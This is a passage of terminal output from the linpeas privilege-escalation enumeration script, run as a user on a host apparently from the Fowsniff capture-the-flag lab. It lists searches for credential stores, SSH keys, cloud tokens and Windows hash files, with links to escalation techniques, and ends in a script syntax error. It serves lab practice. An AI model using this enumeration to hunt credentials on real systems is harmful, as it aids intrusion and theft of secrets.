pgsql.conf Not Found

═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No
═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No

╔══════════╣ Analyzing Mongo Files (limit 70)
Version: mongo Not Found
mongod Not Found

mongod\*.conf Not Found

╔══════════╣ Analyzing Apache Files (limit 70)
Version: Server version: Apache/2.4.18 (Ubuntu)
Server built: 2017-09-18T15:09:02
httpd Not Found

══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Mar 8 2018 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Mar 8 2018 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Mar 8 2018 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf # The ServerName directive sets the request scheme, hostname and port that # redirection URLs. In the context of virtual hosts, the ServerName
#ServerName www.example.com

-rw-r--r-- 1 root root 1332 Mar 19 2016 /etc/apache2/sites-available/000-default.conf
<VirtualHost \*:80> # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request's Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly.
#ServerName www.example.com
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g.
#LogLevel info ssl:warn
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with "a2disconf".
#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

lrwxrwxrwx 1 root root 35 Mar 8 2018 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost \*:80> # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request's Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly.
#ServerName www.example.com
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g.
#LogLevel info ssl:warn
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with "a2disconf".
#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

╔══════════╣ Analyzing Tomcat Files (limit 70)
tomcat-users.xml Not Found

╔══════════╣ Analyzing FastCGI Files (limit 70)
fastcgi_params Not Found

╔══════════╣ Analyzing Http conf Files (limit 70)
httpd.conf Not Found

╔══════════╣ Analyzing Htpasswd Files (limit 70)
.htpasswd Not Found

╔══════════╣ Analyzing PHP Sessions Files (limit 70)
/var/lib/php/sessions Not Found
sess\_\* Not Found

╔══════════╣ Analyzing Wordpress Files (limit 70)
wp-config.php Not Found

╔══════════╣ Analyzing Drupal Files (limit 70)
settings.php Not Found

╔══════════╣ Analyzing Moodle Files (limit 70)
config.php Not Found

╔══════════╣ Analyzing Supervisord Files (limit 70)
supervisord.conf Not Found

╔══════════╣ Analyzing Cesi Files (limit 70)
cesi.conf Not Found

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30 2013 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
comment = public archive
path = /var/www/pub
use chroot = yes
lock file = /var/lock/rsyncd
read only = yes
list = yes
uid = nobody
gid = nogroup
strict modes = yes
ignore errors = no
ignore nonreadable = yes
transfer logging = no
timeout = 600
refuse options = checksum dry-run
dont compress = _.gz _.tgz _.zip _.z _.rpm _.deb _.iso _.bz2 \*.tbz

rsyncd.secrets Not Found

╔══════════╣ Analyzing Hostapd Files (limit 70)
hostapd.conf Not Found

╔══════════╣ Searching wifi conns file
Not Found

╔══════════╣ Analyzing Anaconda ks Files (limit 70)
anaconda-ks.cfg Not Found

╔══════════╣ Analyzing VNC Files (limit 70)
.vnc Not Found

_vnc_.c*nf* Not Found

_vnc_.ini Not Found

_vnc_.txt Not Found

_vnc_.xml Not Found

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Mar 8 2018 /etc/ldap

╔══════════╣ Analyzing OpenVPN Files (limit 70)
\*.ovpn Not Found

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)
id_dsa\* Not Found

id_rsa\* Not Found

known_hosts Not Found

authorized_hosts Not Found

authorized_keys Not Found

Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/var/spool/postfix/etc/ssl/certs/ca-certificates.crt
1112PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config
AuthorizedKeysFile .ssh/authorized_keys
Subsystem sftp /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

Searching inside /etc/ssh/ssh*config for interesting info
Host \*
SendEnv LANG LC*\*
HashKnownHosts yes
GSSAPIAuthentication yes
GSSAPIDelegateCredentials no

╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
No

╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
tickets kerberos Not Found
klist Not Found

╔══════════╣ Analyzing Knockd Files (limit 70)
_knockd_ Not Found

╔══════════╣ Analyzing Kibana Files (limit 70)
kibana.y\*ml Not Found

╔══════════╣ Analyzing Elasticsearch Files (limit 70)
The version is
elasticsearch.y\*ml Not Found

╔══════════╣ Searching logstash files
Not Found

╔══════════╣ Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

╔══════════╣ Searching AD cached hashes
cached hashes Not Found

╔══════════╣ Searching screen sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
screen Not Found

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

╔══════════╣ Analyzing CouchDB Files (limit 70)
couchdb Not Found

╔══════════╣ Analyzing Redis Files (limit 70)
redis.conf Not Found

╔══════════╣ Searching dovecot files
dovecot credentials Not Found

╔══════════╣ Analyzing Mosquitto Files (limit 70)
mosquitto.conf Not Found

╔══════════╣ Analyzing Neo4j Files (limit 70)
neo4j Not Found

╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
credentials Not Found

credentials.db Not Found

legacy_credentials.db Not Found

access_tokens.db Not Found

access_tokens.json Not Found

accessTokens.json Not Found

azureProfile.json Not Found

TokenCache.dat Not Found

AzureRMContext.json Not Found

.bluemix Not Found

╔══════════╣ Analyzing Cloud Init Files (limit 70)
cloud.cfg Not Found

╔══════════╣ Analyzing CloudFlare Files (limit 70)
.cloudflared Not Found

╔══════════╣ Analyzing Erlang Files (limit 70)
.erlang.cookie Not Found

╔══════════╣ Analyzing GMV Auth Files (limit 70)
gvm-tools.conf Not Found

╔══════════╣ Analyzing IPSec Files (limit 70)
ipsec.secrets Not Found

ipsec.conf Not Found

╔══════════╣ Analyzing IRSSI Files (limit 70)
.irssi Not Found

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 8 2018 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 Mar 8 2018 /var/lib/apt/keyrings

\*.keyring Not Found

\*.keystore Not Found

\*.jks Not Found

╔══════════╣ Analyzing Filezilla Files (limit 70)
filezilla Not Found

filezilla.xml Not Found

recentservers.xml Not Found

╔══════════╣ Analyzing Backup Manager Files (limit 70)
storage.php Not Found

database.php Not Found

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing kcpassword files
╚ TODO
n

╔══════════╣ Searching GitLab related files

╔══════════╣ Analyzing Github Files (limit 70)
.github Not Found

.gitconfig Not Found

.git-credentials Not Found

.git Not Found

╔══════════╣ Analyzing Svn Files (limit 70)
.svn Not Found

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found
\*.pgp Not Found

-rw-r--r-- 1 root root 12255 Mar 8 2018 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 4114 Apr 8 2016 /usr/share/gnupg2/distsigkey.gpg
-rw-r--r-- 1 root root 12335 May 18 2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18 2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Nov 5 2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov 5 2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18 2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26 2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Mar 8 2018 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg

\*.gnupg Not Found

╔══════════╣ Analyzing Cache Vi Files (limit 70)
\*.swp Not Found

-rw------- 1 baksteen users 2981 Mar 13 2018 /home/baksteen/.viminfo

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket

╔══════════╣ Analyzing Firefox Files (limit 70)
.mozilla Not Found

Firefox Not Found

╔══════════╣ Analyzing Chrome Files (limit 70)
google-chrome Not Found

Chrome Not Found

╔══════════╣ Analyzing Autologin Files (limit 70)
autologin Not Found

autologin.conf Not Found

╔══════════╣ S/Key authentication

╔══════════╣ YubiKey authentication

╔══════════╣ Passwords inside pam.d

╔══════════╣ Analyzing SNMP Files (limit 70)
snmpd.conf Not Found

╔══════════╣ Analyzing Pypirc Files (limit 70)
.pypirc Not Found

╔══════════╣ Analyzing Ldaprc Files (limit 70)
.ldaprc Not Found

╔══════════╣ Analyzing Env Files (limit 70)
.env Not Found

╔══════════╣ Analyzing Msmtprc Files (limit 70)
.msmtprc Not Found

╔══════════╣ Analyzing Keepass Files (limit 70)
\*.kdbx Not Found

KeePass.config\* Not Found

KeePass.ini Not Found

KeePass.enforced\* Not Found

╔══════════╣ Analyzing FTP Files (limit 70)
\*.ftpconfig Not Found

ffftp.ini Not Found

ftp.ini Not Found

ftp.config Not Found

sites.ini Not Found

wcx_ftp.ini Not Found

winscp.ini Not Found

ws_ftp.ini Not Found

╔══════════╣ Analyzing Opera Files (limit 70)
com.operasoftware.Opera Not Found

╔══════════╣ Analyzing Safari Files (limit 70)
Safari Not Found

╔══════════╣ Analyzing Bind Files (limit 70)
bind Not Found

╔══════════╣ Analyzing SeedDMS Files (limit 70)
seeddms\* Not Found

╔══════════╣ Analyzing Ddclient Files (limit 70)
ddclient.conf Not Found

╔══════════╣ Analyzing Cacti Files (limit 70)
cacti Not Found

╔══════════╣ Analyzing Interesting logs Files (limit 70)
access.log Not Found

error.log Not Found

╔══════════╣ Analyzing Windows Files Files (limit 70)
unattend.inf Not Found

\*.rdg Not Found

AppEvent.Evt Not Found

ConsoleHost_history.txt Not Found

FreeSSHDservice.ini Not Found

NetSetup.log Not Found

Ntds.dit Not Found

protecteduserkey.bin Not Found

RDCMan.settings Not Found

SAM Not Found

SYSTEM Not Found

SecEvent.Evt Not Found

appcmd.exe Not Found

bash.exe Not Found

datasources.xml Not Found

default.sav Not Found

drives.xml Not Found

groups.xml Not Found

https-xampp.conf Not Found

https.conf Not Found

iis6.log Not Found

index.dat Not Found

my.cnf Not Found

my.ini Not Found

ntuser.dat Not Found

pagefile.sys Not Found

php.ini Not Found

printers.xml Not Found

recentservers.xml Not Found

scclient.exe Not Found

scheduledtasks.xml Not Found

security.sav Not Found

server.xml Not Found

setupinfo Not Found

setupinfo.bak Not Found

sitemanager.xml Not Found

sites.ini Not Found

software Not Found

software.sav Not Found

sysprep.inf Not Found

sysprep.xml Not Found

system.sav Not Found

unattend.txt Not Found

unattend.xml Not Found

unattended.xml Not Found

wcx_ftp.ini Not Found

ws_ftp.ini Not Found

web\*.config Not Found

winscp.ini Not Found

wsl.exe Not Found

╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31 2015 /etc/skel/.bashrc
-rw-r--r-- 1 baksteen users 3771 Aug 31 2015 /home/baksteen/.bashrc

.google_authenticator Not Found

hosts.equiv Not Found

.lesshst Not Found

.plan Not Found

-rw-r--r-- 1 root root 655 May 16 2017 /etc/skel/.profile
-rw-r--r-- 1 baksteen users 655 May 16 2017 /home/baksteen/.profile

.recently-used.xbel Not Found

.rhosts Not Found

.sudo_as_admin_successful Not Found

./linpeas.sh: 3338: ./linpeas.sh: Syntax error: Unterminated quoted string
baksteen@fowsniff:~$

```
